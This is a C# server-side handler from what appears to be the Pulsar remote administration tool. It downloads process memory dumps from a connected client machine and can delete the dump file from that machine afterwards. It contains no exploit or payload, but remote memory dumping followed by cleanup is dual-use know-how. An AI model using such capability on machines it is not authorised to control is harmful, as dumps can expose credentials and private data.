﻿using Pulsar.Common.Enums;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Administration.FileManager;
using Pulsar.Common.Messages.Administration.TaskManager;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Networking;
using Pulsar.Server.Models;
using Pulsar.Server.Networking;
using System;
using static Pulsar.Server.Messages.FileManagerHandler;

namespace Pulsar.Server.Messages
{
    public class MemoryDumpHandler : MessageProcessorBase<string>, IDisposable
    {
        /// <summary>
        /// Raised when a dump transfer updated.
        /// </summary>
        /// <remarks>
        /// Handlers registered with this event will be invoked on the 
        /// <see cref="System.Threading.SynchronizationContext"/> chosen when the instance was constructed.
        /// </remarks>
        public event FileTransferUpdatedEventHandler FileTransferUpdated;

        /// <summary>
        /// The client which is associated with this memory dump handler.
        /// </summary>
        private readonly Client _client;

        private readonly FileManagerHandler _fileManagerHandler;

        private readonly DoProcessDumpResponse _activeDump;

        /// <summary>
        /// Initializes a new instance of the <see cref="MemoryDumpHandler"/> class using the given client.
        /// </summary>
        /// <param name="client">The associated client.</param>
        /// <param name="response">The process dump this handler tracks.</param>
        public MemoryDumpHandler(Client client, DoProcessDumpResponse response) : base(true)
        {
            _client = client;
            _activeDump = response;
            _fileManagerHandler = new FileManagerHandler(client);
            _fileManagerHandler.FileTransferUpdated += OnFileTransferUpdateForward;
            MessageHandler.Register(_fileManagerHandler);
        }

        /// <inheritdoc />
        public override bool CanExecute(IMessage message) => message is FileTransferComplete;

        /// <inheritdoc />
        public override bool CanExecuteFrom(ISender sender) => _client.Equals(sender);

        /// <inheritdoc />
        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case FileTransferComplete complete:
                    Execute(sender, complete);
                    break;
            }
        }

        private void Execute(ISender sender, FileTransferComplete complete)
        {

        }

        private void OnFileTransferUpdateForward(object sender, FileTransfer transfer)
        {
            FileTransferUpdated?.Invoke(sender, transfer);
        }

        public void Cleanup(FileTransfer transfer)
        {
            _fileManagerHandler.DeleteFile(transfer.RemotePath, FileType.File);
        }

        public void BeginDumpDownload(DoProcessDumpResponse response)
        {
            string fileName = $"{response.UnixTime}_{response.Pid}_{response.ProcessName}.dmp";
            this._fileManagerHandler.BeginDownloadFile(response.DumpPath, fileName, true);
        }

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            this._fileManagerHandler.FileTransferUpdated -= OnFileTransferUpdateForward;
            MessageHandler.Unregister(this._fileManagerHandler);
            this._fileManagerHandler.Dispose();
        }
    }
}
